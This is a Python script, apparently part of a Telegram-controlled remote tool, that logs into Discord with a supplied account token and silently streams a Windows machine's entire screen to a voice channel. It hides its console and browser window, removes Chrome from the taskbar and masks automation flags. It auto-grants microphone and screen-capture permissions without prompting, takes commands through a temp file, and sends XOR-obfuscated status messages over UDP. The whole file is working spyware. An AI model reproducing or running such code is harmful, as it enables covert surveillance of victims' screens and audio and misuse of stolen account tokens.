import os
import time
import json
import tempfile
import shutil
import subprocess
import ctypes
import ctypes.wintypes
import threading
import undetected_chromedriver as uc
import sys
import asyncio
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import socket
import base64
import datetime

# Скрытие окна консоли при запуске (только для Windows)
try:
    if os.name == 'nt':
        hWnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hWnd != 0:
            ctypes.windll.user32.ShowWindow(hWnd, 0) # SW_HIDE
except:
    pass

class DiscordInjector:
    def __init__(self, callback=None, headless=True, user_data_dir=None):
        self.driver = None
        self.callback = callback
        self.headless = headless 
        self.proxy_url = None # Disabled as requested
        self.user_data_dir = user_data_dir
        self._temp_dir = tempfile.gettempdir()

    def _get_chrome_version(self):
        """Пытается определить основную версию Chrome через реестр Windows"""
        try:
            import winreg
            paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Google\Chrome\BLBeacon", "version"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome", "displayversion"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome", "displayversion")
            ]
            for hkey, path, value_name in paths:
                try:
                    key = winreg.OpenKey(hkey, path)
                    v, _ = winreg.QueryValueEx(key, value_name)
                    winreg.CloseKey(key)
                    return int(v.split('.')[0])
                except: continue
        except: pass
        return None

    def _get_options(self, profile_path):
        options = uc.ChromeOptions()
        options.add_argument("--window-position=-31000,-31000")
        options.add_argument("--window-size=1280,720")
        options.add_argument(f"--user-data-dir={profile_path}")
        options.add_argument("--use-fake-ui-for-media-stream")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-notifications")
        options.add_argument("--no-first-run")
        options.add_argument("--no-default-browser-check")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--lang=ru")
        options.add_argument("--auto-select-desktop-capture-source=Весь экран")
        options.add_argument("--enable-usermedia-screen-capturing")
        options.add_argument("--use-fake-ui-for-media-stream")



        if self.headless:
            options.add_argument("--disable-gpu")
            options.add_argument("--hide-scrollbars")
            options.add_argument("--mute-audio")
        return options

    def log(self, text, status="info"):
        prefix = "[*]"
        if status == "success": prefix = "[+]"
        elif status == "error": prefix = "[-]"
        elif status == "warning": prefix = "[!]"
        
        # Structure progress for Telegram: "Discord Progress: [BAR] XX% | Status"
        if "[PROGRESS]" in text:
            msg = text.replace("[PROGRESS]", "Discord Progress:")
        else:
            msg = f"{prefix} {text}"
            
        print(msg)
        # Also log to file for GlobalLogger to forward
        try:
            with open(r"C:\Users\Public\discord_debug.log", "a", encoding="utf-8") as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
        except: pass
        try:
            with open("C:\\Users\\Public\\discord_debug.log", "a", encoding="utf-8") as f:
                f.write(f"[{datetime.datetime.now()}] {msg}\n")
        except: pass

        if self.callback:
            try: self.callback(msg)
            except: pass

    def _clean_all_driver_caches(self):
        self.log("[PROGRESS] [*] Очистка кешей драйверов (Nuclear Clean)...")
        caches = [
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "undetected_chromedriver")
        ]
        for c in caches:
            if os.path.exists(c):
                try: 
                    shutil.rmtree(c, ignore_errors=True)
                    self.log(f"[PROGRESS] [*] Кеш очищен: {c}")
                except: pass

    def _is_valid_exe(self, path):
        if not os.path.exists(path): return False
        try:
            # Пытаемся запустить версию. Если это не Win32 или файл битый - упадет с OSError
            res = subprocess.run([path, "--version"], capture_output=True, timeout=3)
            return res.returncode == 0
        except:
            return False

    def _kill_old_drivers(self):
        self.log("[PROGRESS] [*] Очистка старых драйверов и процессов...")
        try:
            subprocess.run("taskkill /F /IM chromedriver.exe /T", shell=True, capture_output=True)
            subprocess.run("taskkill /F /FI \"IMAGENAME eq chrome.exe\"", shell=True, capture_output=True)
            time.sleep(1)
        except: pass

    async def _start_driver(self):
        """Пытается запустить драйвер, используя несколько стратегий (fallback)"""
        self.log("[PROGRESS] [*] Запуск изолированного браузера (Selenium UC)...")
        self._clean_all_driver_caches()
        self._kill_old_drivers()
        
        # Цепочка попыток запуска с РАЗНЫМИ профилями и стратегиями
        version = self._get_chrome_version()
        
        if self.user_data_dir:
            base_profile = self.user_data_dir
        else:
            base_profile = os.path.join(self._temp_dir, "discord_profile_")
        
        # Disable taskbar loop for visibility
        if self.headless: 
            threading.Thread(target=self._hide_browser_from_taskbar_loop, daemon=True).start()

        """
        # Попытка 1: UC + subprocess + Fresh Profile 1
        try:
            p1 = base_profile if self.user_data_dir else base_profile + "1"
            if not self.user_data_dir and os.path.exists(p1): shutil.rmtree(p1, ignore_errors=True)
            self.log(f"[PROGRESS] [*] Попытка 1: Инициализация UC (версия: {version or 'авто'})...")
            self.driver = uc.Chrome(options=self._get_options(p1), version_main=version, use_subprocess=True)
            self.log("[PROGRESS] [+] Драйвер запущен (Попытка 1).", "success")
            return True
        except Exception as e:
            self.log(f"[PROGRESS] [-] Попытка 1 не удалась: {e}", "warning")

        # Попытка 2: UC No Subprocess + Profile 2
        try:
            p2 = base_profile + "2"
            if os.path.exists(p2): shutil.rmtree(p2, ignore_errors=True)
            self.log("[PROGRESS] [*] Попытка 2: Инициализация без subprocess...")
            self.driver = uc.Chrome(options=self._get_options(p2), version_main=version, use_subprocess=False)
            self.log("[PROGRESS] [+] Драйвер запущен (Попытка 2).", "success")
            return True
        except Exception as e:
            self.log(f"[PROGRESS] [-] Попытка 2 не удалась: {e}", "warning")

        # Попытка 3: UC Minimal + No Version
        try:
            p3 = base_profile + "3"
            if os.path.exists(p3): shutil.rmtree(p3, ignore_errors=True)
            self.log("[PROGRESS] [*] Попытка 3: UC Minimal (без указания версии)...")
            minimal_opts = uc.ChromeOptions()
            minimal_opts.add_argument("--no-sandbox")
            minimal_opts.add_argument(f"--user-data-dir={p3}")
            minimal_opts.add_argument("--mute-audio")
            
            self.driver = uc.Chrome(options=minimal_opts, use_subprocess=True, headless=False)
            self.log("[PROGRESS] [+] Драйвер запущен (Попытка 3).", "success")
            return True
        except Exception as e:
            self.log(f"[PROGRESS] [-] Попытка 3 не удалась: {e}", "warning")
        """

        # Попытка 4: Использование ЗАРАБОТАВШЕГО драйвера
        try:
            self.log("[PROGRESS] [*] Попытка 4: Использование проверенного драйвера...")
            from selenium import webdriver
            from selenium.webdriver.chrome.service import Service
            
            # ЖЕСТКО ПРОПИСЫВАЕМ ПУТЬ (рабочий!)
            driver_path = r"C:\Users\zxc23\.wdm\drivers\chromedriver\win64\145.0.7632.117\chromedriver-win32\chromedriver.exe"
            
            # Дополнительная проверка: если папки нет (кеш был стерт), восстанавливаем
            if not os.path.exists(driver_path) or not driver_path.lower().endswith(".exe"):
                self.log("[PROGRESS] ⚠️ Рабочий драйвер не найден или путь некорректен. Восстанавливаю через WDM...")
                try:
                    from webdriver_manager.chrome import ChromeDriverManager
                    wdm_path = ChromeDriverManager().install()
                    
                    # Фикс: WDM иногда возвращает путь к папке или текстовому файлу
                    if os.path.isdir(wdm_path):
                        search_dir = wdm_path
                    else:
                        search_dir = os.path.dirname(wdm_path)
                    
                    # Ищем сам .exe файл в этой папке
                    found_exe = None
                    for root, dirs, files in os.walk(search_dir):
                        for f in files:
                            if f.lower() == "chromedriver.exe":
                                found_exe = os.path.join(root, f)
                                break
                        if found_exe: break
                    
                    if found_exe:
                        driver_path = found_exe
                        self.log(f"[PROGRESS] Драйвер найден: {driver_path}")
                except Exception as e:
                    self.log(f"[PROGRESS] Ошибка при восстановлении через WDM: {e}", "warning")

            if not os.path.exists(driver_path):
                raise Exception(f"Критическая ошибка: Драйвер не найден даже после попытки восстановления.")
            
            self.log("[PROGRESS] [!] Использую драйвер: " + driver_path)
            
            opts = webdriver.ChromeOptions()
            opts.add_argument("--window-position=-31000,-31000")
            opts.add_argument("--window-size=1280,720")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-notifications")
            opts.add_argument("--no-first-run")
            opts.add_argument("--no-default-browser-check")
            opts.add_argument("--disable-blink-features=AutomationControlled")
            opts.add_argument("--mute-audio")
            opts.add_argument("--lang=ru")
            opts.add_argument("--auto-select-desktop-capture-source=Весь экран")
            opts.add_argument("--enable-usermedia-screen-capturing")
            opts.add_argument("--use-fake-ui-for-media-stream")
            
            # ВАЖНО: отключаем автоматизацию и блокируем камеру
            opts.add_experimental_option("excludeSwitches", ["enable-automation"])
            opts.add_experimental_option('useAutomationExtension', False)
            opts.add_experimental_option("prefs", {
                "profile.default_content_setting_values.media_stream_mic": 1,
                "profile.default_content_setting_values.media_stream_camera": 2, # Block Camera
                "profile.default_content_setting_values.notifications": 2
            })
            
            # Запускаем сервис и драйвер
            service = Service(driver_path)
            
            p4 = base_profile if self.user_data_dir else os.path.join(self._temp_dir, "discord_profile_4")
            if not self.user_data_dir and os.path.exists(p4): shutil.rmtree(p4, ignore_errors=True)
            opts.add_argument(f"--user-data-dir={p4}")
            
            self.driver = webdriver.Chrome(service=service, options=opts)
            
            # Проверка что драйвер реально работает
            self.driver.get("about:blank")
            self.log("[PROGRESS] [!] Драйвер успешно запущен (Попытка 4 - ФИНАЛ)!", "success")
            return True
            
        except Exception as e:
            self.log(f"[PROGRESS] [-] Попытка 4 не удалась: {e}", "error")
            import traceback
            traceback.print_exc()
            return False

        # Попытка 5: Обычный Selenium с РУЧНЫМ поиском (фикс WinError 193)
        driver_path = None
        try:
            self.log("[PROGRESS] [*] Попытка 5: Поиск любого рабочего chromedriver...")
            wdm_path = os.path.join(os.path.expanduser("~"), ".wdm", "drivers", "chromedriver")
            if os.path.exists(wdm_path):
                for root, dirs, files in os.walk(wdm_path):
                    for f in files:
                        if f == "chromedriver.exe":
                            path = os.path.join(root, f)
                            if self._is_valid_exe(path):
                                driver_path = path
                                break
                    if driver_path: break
            
            if driver_path:
                from selenium import webdriver
                from selenium.webdriver.chrome.service import Service
                opts = webdriver.ChromeOptions()
                opts.add_argument("--window-position=-31000,-31000")
                opts.add_argument("--lang=ru")
                opts.add_argument("--auto-select-desktop-capture-source=Весь экран")
                opts.add_argument("--enable-usermedia-screen-capturing")
                opts.add_argument("--use-fake-ui-for-media-stream")

                self.driver = webdriver.Chrome(service=Service(driver_path), options=opts)
                self.log("[PROGRESS] [+] Драйвер запущен (Попытка 5 - Selenium Manual).", "success")
                return True
        except Exception as e:
            self.log(f"[PROGRESS] [-] Попытка 5 не удалась: {e}", "warning")

        # Попытка 6: АБСОЛЮТНЫЙ ФИНАЛ - Ручной запуск процесса и аттач
        try:
            self.log("[PROGRESS] [*] Попытка 6 (ULTIMATE): Ручной запуск Chrome и аттач...")
            import socket
            s = socket.socket()
            s.bind(('', 0))
            port = s.getsockname()[1]
            s.close()
            
            p6_profile = base_profile + "ultimate"
            if os.path.exists(p6_profile): shutil.rmtree(p6_profile, ignore_errors=True)
            os.makedirs(p6_profile, exist_ok=True)
            
            # Ищем путь к хрому
            chrome_path = "chrome.exe"
            try:
                import winreg
                for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                    try:
                        with winreg.OpenKey(root, r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe") as key:
                            chrome_path = winreg.QueryValue(key, None)
                            if chrome_path: break
                    except: continue
            except: pass

            args = [
                chrome_path,
                f"--remote-debugging-port={port}",
                f"--user-data-dir={p6_profile}",
                "--window-position=-31000,-31000",
                "--no-first-run",
                "--no-default-browser-check",
                "--lang=ru",
                "--auto-select-desktop-capture-source=Весь экран",
                "--enable-usermedia-screen-capturing",
                "--use-fake-ui-for-media-stream"
            ]

            
            self.log(f"[PROGRESS] [*] Запуск процесса Chrome на порту {port}...")
            subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(5) # Даем время проснуться
            
            from selenium import webdriver
            opts = webdriver.ChromeOptions()
            opts.add_experimental_option("debuggerAddress", f"127.0.0.1:{port}")
            
            # Используем найденный ранее driver_path или ищем заново
            if not driver_path:
                driver_path = "chromedriver.exe" 

            from selenium.webdriver.chrome.service import Service
            self.driver = webdriver.Chrome(service=Service(driver_path), options=opts)
            self.log("[PROGRESS] [+] Драйвер запущен (Попытка 6 - Manual Attach).", "success")
            return True
        except Exception as e:
            self.log(f"[PROGRESS] [-] Критическая ошибка: ВСЕ МЕТОДЫ ПРОВАЛЕНЫ. {e}", "error")
            return False

    def _hide_browser_from_taskbar_loop(self):
        """Агрессивно ищет окно Chrome и убирает из панели задач (цикл для предотвращения мигания)"""
        if os.name != 'nt': return
        try:
            # Цикл в течение 15 секунд с высокой частотой
            start_time = time.time()
            found_hwnds = set()
            
            while time.time() - start_time < 15:
                def enum_windows_callback(hwnd, lparam):
                    if hwnd in found_hwnds: return True
                    if ctypes.windll.user32.IsWindowVisible(hwnd):
                        rect = ctypes.wintypes.RECT()
                        ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(rect))
                        # Проверяем положение окна (оно должно быть за экраном)
                        if rect.left < -10000:
                            # WS_EX_TOOLWINDOW = 0x00000080 (убирает из таскбара)
                            # WS_EX_APPWINDOW = 0x00040000 (показывает в таскбаре)
                            style = ctypes.windll.user32.GetWindowLongW(hwnd, -20)
                            if not (style & 0x00000080): # Если еще не TOOLWINDOW
                                style = (style | 0x00000080) & ~0x00040000
                                ctypes.windll.user32.SetWindowLongW(hwnd, -20, style)
                                found_hwnds.add(hwnd)
                                # Для Chrome часто нужно несколько окон скрыть
                    return True

                enum_windows_proc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)(enum_windows_callback)
                ctypes.windll.user32.EnumWindows(enum_windows_proc, 0)
                time.sleep(0.05) # Супер-частый опрос (50мс) для исключения мигания
        except Exception as e:
            self.log(f"Ошибка в цикле скрытия: {e}", "warning")

    async def connect_and_join(self, token: str, voice_url: str):
        def make_bar(current, total):
            pct = int(current / total * 100) if total else 0
            filled = int(pct / 5)      
            empty = 20 - filled
            bar = "█" * filled + "░" * empty
            return f"[{bar}] {pct}%"

        token_preview = f"{token[:4]}...{token[-4:]}" if len(token) > 8 else "INVALID"
        self.log(f"[PROGRESS] [*] {make_bar(10, 100)} Начало входа. Токен: {token_preview}")

        if not self.driver:
            self.log(f"[PROGRESS] {make_bar(20, 100)} Запуск Selenium...")
            if not await self._start_driver():
                return

        try:
            if hasattr(self.driver, "execute_cdp_cmd"):
                self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                    "source": f"localStorage.setItem('token', '\"{token}\"');"
                })

                self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                    "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
                })
            else:
                self.log("[PROGRESS] [!] Предупреждение: Драйвер не поддерживает CDP команды.", "warning")
        except Exception as e:
            self.log(f"[PROGRESS] [!] Ошибка настройки CDP: {e}", "warning")

        self.log(f"[PROGRESS] {make_bar(40, 100)} Загрузка веб-приложения...")
        self.driver.get("https://discord.com/app")
        time.sleep(10)

        current_url = self.driver.current_url
        if "login" in current_url:
            self.log("[PROGRESS] [-] Состояние: логин. Пробую форсированный инжект в лоб...")
            self.driver.execute_script(f"window.localStorage.setItem('token', '\"{token}\"'); window.location.href = '/app';")
            time.sleep(8)
            current_url = self.driver.current_url

        if "login" in current_url:
            self.log("[PROGRESS] [-] Вход не удался (редирект на логин).", "error")
            return

        self.log(f"[PROGRESS] {make_bar(60, 100)} Успешная авторизация!", "success")

        self.log(f"[PROGRESS] {make_bar(70, 100)} Переход в канал: {voice_url}...")
        self.driver.get(voice_url)
        time.sleep(5)

        self.log("[PROGRESS] [*] Попытка входа в голосовой канал...")
        js_join = '''
            const callback = arguments[arguments.length - 1];
            (async function() {
                const sleep = m => new Promise(r => setTimeout(r, m));
                for (let i = 0; i < 15; i++) {
                    let allNodes = Array.from(document.querySelectorAll('button, a, div, span'));
                    let continueBtn = allNodes.find(n => {
                        let t = (n.innerText || n.textContent || '').toLowerCase();
                        return t.includes('продолжить в браузере') || t.includes('continue in browser');
                    });
                    if (continueBtn) { continueBtn.click(); await sleep(1000); }

                    let closeBtn = document.querySelector('button[aria-label="Close"], [class*="closeButton_"]');
                    if (closeBtn) { closeBtn.click(); }

                    let btns = Array.from(document.querySelectorAll('button, [role="button"]'));
                    let actionBtn = btns.find(b => {
                        let t = (b.innerText || b.textContent || '').toLowerCase();
                        return t.includes('join voice') || t.includes('присоединиться') || t.includes('connect');
                    });
                    if (actionBtn) { 
                        actionBtn.click(); 
                        await sleep(1000);
                        callback("OK");
                        return;
                    }

                    await sleep(1500);
                    if (document.querySelector('[class*="rtcConnectionStatus"]')) {
                        callback("Connected");
                        return;
                    }
                }
                callback("TIMEOUT");
            })();
        '''
        try:
            res = self.driver.execute_async_script(js_join)
            self.log(f"[PROGRESS] {make_bar(90, 100)} Статус входа: {res}")
        except Exception as e:
            self.log(f"[PROGRESS] [-] Ошибка при входе в канал: {e}", "error")

        time.sleep(5) # Ждем прогрузки интерфейса
        await self.toggle_mic()
        time.sleep(1)
        await self.toggle_deafen()
        self.is_ready = True
        self.log(f"[PROGRESS] {make_bar(100, 100)} Бот готов к работе. Используйте кнопки в панели управления.", "success")
        
        # Start command listener in a separate thread
        threading.Thread(target=self._command_listener_loop, daemon=True).start()

    def _command_listener_loop(self):
        cmd_file = os.path.join(tempfile.gettempdir(), "discord_cmd.txt")
        self.log("[PROGRESS] [*] Ожидание команд управления...")
        while True:
            if os.path.exists(cmd_file):
                try:
                    with open(cmd_file, "r") as f:
                        cmd = f.read().strip()
                    os.remove(cmd_file)
                    
                    if cmd == "mute_mic":
                         asyncio.run_coroutine_threadsafe(self.toggle_mic(), asyncio.get_event_loop())
                    elif cmd == "deafen":
                         asyncio.run_coroutine_threadsafe(self.toggle_deafen(), asyncio.get_event_loop())
                    elif cmd == "stream":
                         asyncio.run_coroutine_threadsafe(self.start_stream(), asyncio.get_event_loop())
                    elif cmd == "disconnect":
                         self.log("[PROGRESS] [!] Получена команда на отключение.")
                         os._exit(0)
                except: pass
            time.sleep(1)

    async def start_stream(self):
        if not self.driver or not self.is_ready: return
        self.log("[PROGRESS] [*] Запуск трансляции всего экрана...")
        
        # Селектор от пользователя (Stream)
        user_sel = '#app-mount > div.appAsidePanelWrapper_a3002d > div > div.app_a3002d > div > div.layers__960e4.layers__160d8 > div > div > div > div.content__5e434 > div.sidebar__5e434.theme-dark.images-dark > section > div.wrapper_e131a9 > div > div.actionButtons_e131a9 > button:nth-child(3)'

        js_stream = f'''
            const callback = arguments[arguments.length - 1];
            (async function() {{
                const sleep = m => new Promise(r => setTimeout(r, m));
                
                // 1. Нажимаем кнопку Share Your Screen
                let shareBtn = document.querySelector("{user_sel}") || 
                               document.querySelector('button[aria-label*="Share Your Screen"]') || 
                               document.querySelector('button[aria-label*="экрана"]');
                
                if (!shareBtn) {{ callback("Кнопка Share не найдена"); return; }}
                shareBtn.click();
                await sleep(1500);

                // 2. Если открылось окно выбора, нажимаем "Entire Screen" (если есть табы)
                // Но обычно оно сразу открывает подтверждение "Go Live" в нашем случае

                // 3. Ищем кнопку Go Live (Confirmation) с повторными попытками
                for (let i = 0; i < 10; i++) {{
                    let goLiveBtn = Array.from(document.querySelectorAll('button')).find(b => {{
                        const txt = b.innerText.toLowerCase();
                        const label = (b.getAttribute('aria-label') || "").toLowerCase();
                        return txt.includes("go live") || txt.includes("в эфир") || txt.includes("прямой эфир") ||
                               label.includes("go live") || label.includes("в эфир");
                    }});

                    if (!goLiveBtn) {{
                        goLiveBtn = document.querySelector('div[class*="modal"] button[class*="colorBrand"]');
                    }}

                    if (goLiveBtn) {{
                        goLiveBtn.click();
                        callback("OK");
                        return;
                    }}
                    await sleep(500);
                }}
                callback("Кнопка Go Live не появилась в течение 5 сек");
            }})();
        '''
        try:
            res = self.driver.execute_async_script(js_stream)
            self.log(f"[PROGRESS] [+] Трансляция: {res}")
        except Exception as e:
            self.log(f"[PROGRESS] [-] Ошибка трансляции: {e}", "error")

    async def toggle_mic(self):
        if not self.driver: return
        self.log("[PROGRESS] [*] Переключение микрофона...")
        
        js = f'''
            return (function() {{
                try {{
                    let btn = document.querySelector('button[aria-label*="Mute"], button[aria-label*="Unmute"], button[aria-label*="Микрофон"], button[class*="audioButton"]');
                    if (btn) {{
                        btn.click();
                        return (btn.getAttribute('aria-checked') === 'true' ? "MUTED" : "UNMUTED");
                    }} else {{
                        return "Кнопка не найдена";
                    }}
                }} catch(e) {{ return "Ошибка JS: " + e.toString(); }}
            }})();
        '''
        try:
            res = self.driver.execute_script(js)
            self.log(f"[PROGRESS] [+] Микрофон: {res}")
        except Exception as e:
            self.log(f"[PROGRESS] [-] Ошибка микрофона: {e}")

    async def toggle_deafen(self):
        if not self.driver: return
        self.log("[PROGRESS] [*] Переключение звука...")
        
        # Новый селектор от пользователя (Headphones)
        user_sel = '#app-mount > div.appAsidePanelWrapper_a3002d > div > div.app_a3002d > div > div.layers__960e4.layers__160d8 > div > div > div > div.content__5e434 > div.sidebar__5e434.theme-dark.images-dark > section > div.container__37e49.containerRtcOpened__37e49 > div.buttons__37e49 > div:nth-child(2) > button.button__67645.audioButtonWithMenu__5e764.enabled__67645.button__201d5.lookBlank__201d5.colorBrand__201d5.grow__201d5.button__67645.audioButtonWithMenu__5e764'
        
        js = f'''
            return (function() {{
                try {{
                    let btn = document.querySelector("{user_sel}") || 
                              document.querySelector('button[aria-label*="Deafen"], button[aria-label*="Undeafen"], button[aria-label*="Наушники"], button[class*="deafenButton"]');
                    if (btn) {{
                        btn.click();
                        return (btn.getAttribute('aria-checked') === 'true' ? "DEAFENED" : "UNDEAFENED");
                    }} else {{
                        return "Кнопка не найдена";
                    }}
                }} catch(e) {{ return "Ошибка JS: " + e.toString(); }}
            }})();
        '''
        try:
            res = self.driver.execute_script(js)
            self.log(f"[PROGRESS] [+] Звук: {res}")
        except Exception as e:
            self.log(f"[PROGRESS] [-] Ошибка звука: {e}")

    async def close(self):
        self.log("[PROGRESS] [*] Завершение работы Selenium драйвера...")
        if self.driver:
            try: self.driver.quit()
            except: pass
            self.driver = None

        time.sleep(1)

        subprocess.run("taskkill /F /IM chromedriver.exe /T", shell=True, capture_output=True)
        if self.user_data_dir and os.path.exists(self.user_data_dir):
            try: shutil.rmtree(self.user_data_dir)
            except: pass
        self.log("[PROGRESS] [+] Сессия закрыта.")

def tg_notify(msg, port=51337):
    try:
        salt = b"n2xkNQYbZwj8r9fz"
        data = msg.encode('utf-8')
        xor_data = bytearray([data[i] ^ salt[i % len(salt)] for i in range(len(data))])
        payload = base64.b64encode(xor_data).decode('utf-8')
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(payload.encode('utf-8'), ("127.0.0.1", port))
    except: pass

async def main():
    # Usage: discord_bot.py <token> <voice_url> [action] [--udp <port>]
    token = None
    url = None
    action = "join"
    udp_port = 51337
    profile_dir = None

    # Simple manual parse for speed/minimizing dependencies
    i = 1
    args = []
    while i < len(sys.argv):
        if sys.argv[i] == "--udp" and i+1 < len(sys.argv):
            try: udp_port = int(sys.argv[i+1])
            except: pass
            i += 2
        elif sys.argv[i] == "--profile" and i+1 < len(sys.argv):
            profile_dir = sys.argv[i+1]
            i += 2
        else:
            args.append(sys.argv[i])
            i += 1
    
    if len(args) < 2:
        print("Usage: discord_bot.py <token> <voice_url> [action] [--udp <port>]")
        return

    token = args[0]
    url = args[1]
    if len(args) > 2: action = args[2]

    def log_cb(msg):
        # Forward only IMPORTANT progress to Telegram
        if "[PROGRESS]" in msg:
            clean_msg = msg.replace("[PROGRESS]", "").strip()
            # Wrap in HTML for Telegram as BotOrchestrator uses ParseMode.Html
            tg_notify(f"🎮 <b>Discord Remote Bot:</b>\n━━━━━━━━━━━━━━━━━━\n{clean_msg}", port=udp_port)

    tg_notify("🎮 <b>Discord Remote Bot:</b>\n━━━━━━━━━━━━━━━━━━\n[░░░░░░░░░░░░░░░░░░░░] 0% — Инициализация...", port=udp_port)
    
    injector = DiscordInjector(callback=log_cb, headless=True, user_data_dir=profile_dir)
    try:
        await injector.connect_and_join(token, url)
        if action == "join":
            await injector.start_stream()
        
        # Keep alive for a while to maintain connection
        # In a real environment, you might want a better signaling mechanism to close
        tg_notify("🎮 <b>Discord Remote Bot:</b> Successfully connected and streaming.", port=udp_port)
        
        while True:
            await asyncio.sleep(10)
    except Exception as e:
        tg_notify(f"❌ <b>Discord Remote Bot Error:</b> <code>{str(e)}</code>", port=udp_port)
    finally:
        await injector.close()

if __name__ == "__main__":
    asyncio.run(main())
